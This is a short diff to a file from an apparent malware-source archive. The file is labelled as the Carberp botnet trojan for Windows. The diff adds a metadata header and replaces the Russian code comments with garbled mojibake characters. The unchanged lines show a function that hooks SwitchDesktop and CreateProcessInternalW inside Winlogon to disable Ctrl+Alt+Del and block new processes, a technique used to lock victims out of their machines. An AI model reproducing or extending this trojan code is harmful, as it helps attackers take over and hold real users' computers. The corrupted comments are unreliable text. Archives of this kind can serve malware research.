@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 #include <time.h>
 #include <stdio.h>
@@ -39,7 +50,7 @@ void WinlogonPatchForDisableCtrlAtlDel()
 	DWORD Protect;
 	PVOID pFunction;
 
-	//	запрет показа окна входа в виндовс
+	//	пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
   PP_DPRINTF(L"WinlogonPatchForDisableCtrlAtlDel: SwitchDesktop patching...");
 	if ( pFunction = GetProcAddress(GetModuleHandleA("USER32"),"SwitchDesktop") )
 	{
@@ -49,7 +60,7 @@ void WinlogonPatchForDisableCtrlAtlDel()
     PP_DPRINTF(L"WinlogonPatchForDisableCtrlAtlDel: SwitchDesktop patched.");
 	}
 
-	//	запрет запуска процессов винлогону
+	//	пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
   PP_DPRINTF(L"WinlogonPatchForDisableCtrlAtlDel: CreateProcess patching...");
 	if ( pFunction = GetProcAddress(GetModuleHandleA("KERNEL32"),"CreateProcessInternalW") )
 	{
